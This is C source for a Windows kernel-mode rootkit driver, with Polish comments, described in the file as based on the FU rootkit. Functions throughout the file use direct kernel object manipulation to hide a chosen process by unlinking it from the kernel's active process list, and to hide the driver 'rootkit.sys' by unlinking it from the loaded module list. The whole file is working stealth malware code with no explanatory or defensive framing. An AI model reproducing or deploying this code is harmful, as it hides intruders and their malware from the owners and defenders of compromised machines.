
#include <ntddk.h>
#include "rootkit.h"
#include "rk_DKOM.h"
#include "rk_Tools.h"

extern PMODULE_ENTRY	g_ModuleListBegin;
extern NTOSKRNL_OFFSETS offsets;

BOOLEAN DKOM_OnProcessHide(IN ULONG pid) 
{
	PEPROCESS eproc = 0;
	KIRQL tmpIrql;

	DbgPrint("rootkit: PID to hide: %ld\n",pid);

	tmpIrql = RaiseIRQLevel();

    PsLookupProcessByProcessId( (HANDLE)pid, &eproc );

	if (eproc == NULL ) {
		DbgPrint("rootkit: Nie moge znalezc bloku EPROCESS\n");	 
  	    LowerIRQLevel( tmpIrql );
		return FALSE;
	}
	
	DKOM_HideProcess( eproc );
	
	LowerIRQLevel( tmpIrql );


	return TRUE;
}

// kod bazuje na FU rootkit
VOID DKOM_HideProcess( PEPROCESS eproces )
{
	PLIST_ENTRY plist_active_procs;
	plist_active_procs = (PLIST_ENTRY)((ULONG)eproces + offsets.activeProcessListOffset);

	*( (ULONG*)plist_active_procs->Blink )  = (ULONG)plist_active_procs->Flink;
	*( (ULONG*)plist_active_procs->Flink+1) = (ULONG)plist_active_procs->Blink;
	
	plist_active_procs->Flink = (LIST_ENTRY*)&(plist_active_procs->Flink);
	plist_active_procs->Blink = (LIST_ENTRY*)&(plist_active_procs->Flink);
}

BOOLEAN DKOM_HideRootkitModule() 
{
	UNICODE_STRING rootkitdriver;
	PMODULE_ENTRY pHelper;	
    BOOLEAN	 bFound;

//	tmpIrql = RaiseIRQLevel();

    bFound = FALSE;

	RtlInitUnicodeString( &rootkitdriver, L"rootkit.sys" );

	DbgPrint("rootkit: Chowam driver: %S\n",rootkitdriver.Buffer);

//	DbgPrint("g_PsLoadedModuleList: %x\n",g_PsLoadedModuleList);

	pHelper = g_ModuleListBegin;

	while ((PMODULE_ENTRY)pHelper->le_mod.Flink != g_ModuleListBegin ) {
		if ( (pHelper->unk1 != 0x00000000) && (pHelper->driver_Path.Length!=0)) {
			//porownujemy nazwy driverow
			if (RtlCompareUnicodeString(&rootkitdriver, &(pHelper->driver_Name),FALSE ) == 0 ) {
				//zminieniamy sasiadow
				*((PULONG)pHelper->le_mod.Blink) = (ULONG)pHelper->le_mod.Flink;
				pHelper->le_mod.Flink->Blink = pHelper->le_mod.Blink;
				return TRUE;
			}
		}
		pHelper = (PMODULE_ENTRY)pHelper->le_mod.Flink;
	}

    return FALSE;
}

ULONG DKOM_GetModuleListBegin (PDRIVER_OBJECT  DriverObject)
{
	PMODULE_ENTRY pHelper;

	pHelper = *((PMODULE_ENTRY*)((ULONG)DriverObject + 0x14));
	if (pHelper == NULL)
		return 0;
	
	return (ULONG) pHelper;
}
